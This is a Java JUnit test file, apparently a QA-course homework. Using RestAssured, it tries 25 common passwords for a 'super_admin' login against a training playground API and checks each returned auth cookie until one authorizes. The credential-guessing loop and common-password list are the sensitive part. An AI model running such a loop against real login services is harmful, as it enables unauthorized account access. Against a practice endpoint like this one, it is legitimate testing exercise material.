import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import io.restassured.response.ResponseBody;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class TestHomeWork2_3 {
    @Test
    public void mainLogic(){
        String login="super_admin";
        String[] passwords= {"123456","123456789","qwerty","password","1234567",
        "12345678","12345","123qwe","iloveyou","111111",
        "123123","abc123","qwerty123","1q2w3e4r","admin",
        "qwertyuiop","654321","555555","lovely","7777777",
                "welcome","888888","princess","dragon","password1"};
        System.out.println("Ожидайте, идет подбор пароля...");
        for (int i=0;i<passwords.length;i++){
        Response gettingCookies=getCookies(login,passwords[i]);
        String cookie=gettingCookies.getCookie("auth_cookie");
        Response result =authAttemp(cookie);
        String authResult=result.print();
        if (authResult.equals("You are authorized")){
            System.out.println(passwords[i]+ " верный пароль");
            break;
        }
        }
    }

    public Response getCookies(String login,String password){
        Map<String,String> body=new HashMap<>();
        body.put("login",login);
        body.put("password",password);

        Response response=RestAssured
                .given()
                .body(body)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();
        String cookie=response.getCookie("auth_cookie");
        return response;
    }

    public Response authAttemp(String cookie){
        Map<String,String> cookies=new HashMap<>();{
            cookies.put("auth_cookie",cookie);
        }

        Response response=RestAssured
                .given()
                .cookies(cookies)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();

        return response;
    }


}
